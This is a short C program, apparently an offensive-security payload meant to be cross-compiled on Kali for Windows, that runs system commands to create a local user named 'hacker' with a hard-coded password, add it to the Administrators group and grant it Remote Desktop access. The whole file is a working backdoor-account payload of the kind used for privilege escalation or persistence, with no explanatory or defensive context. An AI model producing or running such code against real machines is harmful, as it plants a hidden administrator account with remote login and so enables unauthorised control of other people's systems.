//to compile this code at kali
//i686-w64-mingw32-gcc adduser.c -o adduser.exe

#include <stdlib.h>
int main()
{
        int i;
        i=system("net user hacker Hacker12345! /add");
        i=system("net localgroup administrators hacker /add");
        i=system("net localgroup \"Remote Desktop Users\" hacker /add");
        return 0;
}